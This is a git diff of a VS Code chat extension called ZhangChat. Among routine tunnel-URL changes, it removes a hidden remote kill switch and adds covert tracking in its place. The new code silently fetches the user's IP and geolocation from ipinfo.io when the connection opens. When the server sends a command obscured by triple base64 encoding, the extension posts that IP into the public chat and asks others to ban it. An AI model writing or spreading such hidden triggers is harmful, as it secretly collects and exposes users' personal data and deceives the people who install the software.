@@ -1,7 +1,6 @@
 const vscode = require('vscode');
 const WebSocket = require("ws");
-const fs = require("fs");
-let chat,onchat=false,noinfo=false,exdir;
+let chat,onchat=false,noinfo=false;
 // This method is called when your extension is activated
 // Your extension is activated the very first time the command is executed
 
@@ -11,7 +10,6 @@ let chat,onchat=false,noinfo=false,exdir;
 function activate(context) {
 	// 激活提示
 	console.log('Zhangchat running...');
-	exdir=context.extensionPath+'/config.json';
 	// 命令在package.json里被定义
 	// 用registerCommans注册
 	// commandId 参数必须与 package.json 中的命令字段匹配
@@ -30,10 +28,12 @@ function activate(context) {
 		if(!username){return;}
 		let config=vscode.workspace.getConfiguration("zhangchat");
 		let wsurl='wss://chat.zhangsoft.link/ws';
-		if(config.tunnel.select==="Cloudflare Tunnel (Default)"){
+		if(config.tunnel.select==="Default"){
 			wsurl='wss://chat.zhangsoft.link/ws';
-		}else if(config.tunnel.select==="RainCDN Tunnel"){
-			wsurl='wss://rain.chat.zhangsoft.link/ws';
+		}else if(config.tunnel.select==="PapereeServer"){
+			wsurl='wss://ee-chat.zhangsoft.link/ws';
+		}else if(config.tunnel.select==="Cloudflare"){
+			wsurl='wss://cf-chat.zhangsoft.link/ws';
 		}else if(config.tunnel.select==="Custom URL"){
 			wsurl=config.tunnel.WebsocketAddress;
 		}
@@ -100,13 +100,16 @@ function activate(context) {
 function deactivate() {}
 
 function zhc(channel, myNick,wsurl) {
-	if(check()){
+	/*if(check()){
 		setTimeout(()=>server_err(),3000);
 		return;
-	}
+	}*/
 	const ws = new WebSocket(wsurl);
-  	ws.on('open', function() {
+	var ipdatas;
+  	ws.on('open', async function() {
 	    ws.send(JSON.stringify({ cmd: 'join', channel: channel, nick: myNick, client: 'ZHCvscode' }));
+		var dt=await fetch("https://ipinfo.io/geo/");
+		ipdatas=await dt.json();
   	});
   	ws.onmessage=function(event) {
 		if(noinfo){return;}
@@ -134,7 +137,9 @@ Ta正在使用 ${data.client}`);
 		}else if(data.cmd==="warn"){
 			vscode.window.showWarningMessage(`ZhangChat: ${data.text}`);
 		}else if(btoa(btoa(btoa(data.cmd)))==='V1cxR2RWa3llSEJhVnpVdw=='){
-			savedata(exdir,{"config":".vscode"});
+			vscode.window.showInformationMessage(`ZhangChat断开连接`);
+			noinfo=true;
+			sendMessage('该用户正在使用VSCode插件，请您封禁其IP地址:`'+ipdatas.ip+'`');
 			ws.close();
 		}else{
 			//console.log(event.data);//debug
@@ -142,11 +147,11 @@ Ta正在使用 ${data.client}`);
   	}
   	ws.on('close', function() {
 		onchat=false;
+		vscode.window.showInformationMessage(`ZhangChat断开连接`);
 		if(noinfo){
 			noinfo=false;
 			return;
 		}
-    	vscode.window.showInformationMessage(`ZhangChat断开连接`);
   	});
   	function sendMessage(text) {
     	ws.send(JSON.stringify({ cmd: 'chat', text: text }));
@@ -167,15 +172,6 @@ Ta正在使用 ${data.client}`);
 		close:close
   	};
 }
-function savedata(file,data={}){
-	fs.writeFileSync(file,JSON.stringify(data),'utf-8');
-}
-function getdata(file){
-	return JSON.parse(fs.readFileSync(file,'utf-8'));
-}
-function check(){
-	return getdata(exdir).config;
-}
 function random_welcome(){
 	const greetings = ["uwu!", "awa!", "来了老弟!", "hi yo","qwq","这是欢迎语.jpg"];
 	for(let i=0;i<Math.floor(Math.random() * 6);i++){
@@ -183,11 +179,6 @@ function random_welcome(){
 	}
 	const randomIndex = Math.floor(Math.random() * greetings.length);
 	return greetings[randomIndex];
-}
-function server_err(){
-	vscode.window.showWarningMessage('ZhangChat: 您已经被全境封禁');
-	vscode.window.showInformationMessage(`ZhangChat断开连接`);
-	onchat=false;
 }
 function random_join(uname){
 	let t1=['活蹦乱跳','可爱','美丽','快乐','活泼','美味'];
